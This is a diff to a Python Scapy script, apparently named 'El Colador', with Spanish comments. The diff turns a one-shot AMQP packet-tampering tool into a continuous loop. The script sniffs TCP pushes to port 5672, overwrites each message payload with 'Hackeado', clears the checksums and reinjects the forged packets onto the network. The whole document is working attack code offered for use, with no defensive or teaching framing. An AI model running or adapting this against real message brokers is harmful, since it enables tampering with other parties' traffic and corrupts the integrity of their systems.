@@ -1,4 +1,4 @@
-# El_Colador_PRO.py
+# El_Colador_PRO_loop.py
 from scapy.all import *
 
 # Pregunta interfaz
@@ -11,34 +11,32 @@ IFACE = "eth0" if input_str == "" else (interfaces[int(input_str) - 1] if input_
 
 FILTER = "tcp dst port 5672 and tcp[tcpflags] & tcp-push != 0"
 
-print(f"[+] Esperando paquete(s) AMQP válido(s) hacia 5672 en {IFACE}…")
-
-N = 5  # Número de paquetes a modificar y reinyectar (aumenta para más chances)
 hack_msg = b"Hackeado"
-
-pkts = sniff(filter=FILTER, iface=IFACE, count=N, timeout=8)
+print(f"[+] El Colador activo en {IFACE}. Sniffing infinito. Ctrl+C para salir.")
 
 enviados = 0
-for pkt in pkts:
-    if pkt.haslayer(Raw):
-        old = pkt[Raw].load
-        if len(hack_msg) > len(old):
-            nuevo = hack_msg[:len(old)]  # Recorta si el nuevo mensaje es más largo
-        else:
-            nuevo = hack_msg.ljust(len(old), b' ')  # Rellena si es más corto
-        pkt_mod = pkt.copy()
-        pkt_mod[Raw].load = nuevo
-        # Corrige checksums y longitud
-        if pkt_mod.haslayer('IP'):
-            del pkt_mod['IP'].chksum
-            del pkt_mod['IP'].len
-        if pkt_mod.haslayer('TCP'):
-            del pkt_mod['TCP'].chksum
-        print(f"[+] Reinyectando paquete modificado con payload: {nuevo!r}")
-        sendp(pkt_mod, iface=IFACE, verbose=0)
-        enviados += 1
-
-if not enviados:
-    print("[!] No se pudo modificar ningún paquete AMQP con datos.")
-
-print(f"[!] {enviados} paquetes modificados y enviados al broker.")
+try:
+    while True:
+        pkts = sniff(filter=FILTER, iface=IFACE, count=1, timeout=10)
+        if not pkts:
+            continue
+        pkt = pkts[0]
+        if pkt.haslayer(Raw):
+            old = pkt[Raw].load
+            if len(hack_msg) > len(old):
+                nuevo = hack_msg[:len(old)]
+            else:
+                nuevo = hack_msg.ljust(len(old), b' ')
+            pkt_mod = pkt.copy()
+            pkt_mod[Raw].load = nuevo
+            # Corrige checksums y longitud
+            if pkt_mod.haslayer('IP'):
+                del pkt_mod['IP'].chksum
+                del pkt_mod['IP'].len
+            if pkt_mod.haslayer('TCP'):
+                del pkt_mod['TCP'].chksum
+            print(f"[+] Paquete modificado y reenviado con payload: {nuevo!r}")
+            sendp(pkt_mod, iface=IFACE, verbose=0)
+            enviados += 1
+except KeyboardInterrupt:
+    print(f"\n[!] El Colador finalizado por el usuario. Total reenviados: {enviados}")
